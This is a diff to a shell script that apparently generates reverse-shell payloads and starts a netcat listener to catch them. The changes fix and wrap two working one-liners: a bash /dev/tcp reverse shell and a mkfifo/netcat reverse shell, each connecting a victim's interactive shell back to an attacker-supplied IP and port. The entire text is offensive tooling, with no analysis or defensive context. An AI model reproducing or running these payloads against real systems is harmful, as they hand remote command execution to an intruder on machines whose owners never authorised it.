@@ -21,7 +21,7 @@ usage()
 
 bash_shell()
 {
-	echo -e "bash -i >& /dev/tcp/"$ip"/"$port" 0>&1\n"
+	echo -e "bash -c 'bash -i >& /dev/tcp/"$ip"/"$port" 0>&1'\n"
 	nc -nvlp $port
 }
 
@@ -57,7 +57,7 @@ nc_shell()
 
 oldnc_shell()
 {
-	echo -e "rm /tmpf;mkfifo /tmpf;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f\n"
+	echo -e "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f\n"
 	nc -nvlp $port
 }
 
